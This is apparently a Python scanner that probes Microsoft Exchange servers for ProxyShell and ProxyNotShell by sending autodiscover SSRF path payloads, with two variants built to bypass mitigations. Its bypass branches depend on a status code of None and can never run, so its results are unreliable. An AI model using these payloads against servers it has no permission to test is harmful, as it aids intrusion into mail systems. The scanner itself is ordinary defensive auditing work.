import requests, sys, re

def CheckVuln(host):
    payload = "/autodiscover/autodiscover.json?a@foo.var/owa/?&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell"
    payload_bypass1 = "/autodiscover/autodiscover.json?a..foo.var/owa/?&Email=autodiscover/autodiscover.json?a..foo.var&Protocol=XYZ&FooProtocol=Powershell"
    payload_bypass2 = "/autodiscover/autodiscover.json?a..foo.var/owa/?&Email=autodiscover/autodiscover.json?a..foo.var&Protocol=XYZ&FooProtocol=%50owershell"

    header = {
        'User-Agent': 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
    }
    response = requests.get("{}{}".format(host,payload), headers=header, verify=False, allow_redirects=False)
    # check vuln
    if (response.status_code == 302) and (response.headers['x-feserver'] != None):
        return "[" + str(response.headers['x-feserver']) + "] Potentially vulnerable to ProxyShell and ProxyNotShell (mitigation not applied)."
    elif (response.status_code != 302) and (response.headers['x-feserver'] != None):
        return "[" + str(response.headers['x-feserver']) + "] Potentially vulnerable to ProxyNotShell (mitigation not applied)."
    elif (response.status_code == 401):
        return "Not Vulnerable (resource requires basic authentication)."
    elif (response.status_code == 404):
        return "Not Vulnerable (affected resource not found)."
    elif (response.status_code == 403):
        return "Not Vulnerable (access to resource is blocked)."
    elif (response.status_code == 500):
        return "Not Vulnerable (internal server error)."
    elif (response.status_code == None):
        response_bypass1 = requests.get("{}{}".format(host,payload_bypass1), headers=header, verify=False, allow_redirects=False)
        if (response_bypass1.status_code == 302) and (response_bypass1.headers['x-feserver'] != None):
            return "[" + str(response_bypass1.headers['x-feserver']) + "] Potentially vulnerable to ProxyShell and ProxyNotShell (mitigation bypassed [ + ])."
        elif (response_bypass1.status_code != 302) and (response_bypass1.headers['x-feserver'] != None):
            return "[" + str(response_bypass1.headers['x-feserver']) + "] Potentially vulnerable to ProxyNotShell (mitigation bypassed [ + ])."
        elif (response_bypass1.status_code == None):
            response_bypass2 = requests.get("{}{}".format(host,payload_bypass2), headers=header, verify=False, allow_redirects=False)
            if (response_bypass2.status_code == 302) and (response_bypass2.headers['x-feserver'] != None):
                return "[" + str(response_bypass2.headers['x-feserver']) + "] Potentially vulnerable to ProxyShell and ProxyNotShell (mitigation bypassed [URL encoding])."
            elif (response_bypass2.status_code != 302) and (response_bypass2.headers['x-feserver'] != None):
                return "[" + str(response_bypass2.headers['x-feserver']) + "] Potentially vulnerable to ProxyNotShell (mitigation bypassed [URL encoding])."
            else:
                return "Not vulnerable (possible mitigation applied)."
        else:
            return "Server not vulnerable or inaccessible."


def Check_url(url):
    #django url validation regex
    url_regex = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
        r'localhost|' #localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE
    )

    if re.match(url_regex, url) is not None:
        return url
    else:
        print("Please specify a URL")
        sys.exit(1)

result = CheckVuln(Check_url(sys.argv[1]))
print(result)
